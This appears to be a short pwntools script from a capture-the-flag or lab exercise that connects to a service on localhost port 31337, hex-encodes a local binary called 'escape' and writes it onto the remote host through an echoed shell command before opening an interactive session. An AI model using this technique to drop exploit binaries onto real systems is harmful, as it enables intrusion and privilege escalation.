from pwn import *

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

conn = remote('127.0.0.1', 31337)

with open('./escape', 'rb') as f:
    hex = f.read().hex()
    f_str = "".join([("\\x" + "".join(digits)) for digits in chunks(hex, 2)])

    conn.send(b"echo -e -n '" + f_str.encode() + b"' > ./escape\n")

conn.interactive()
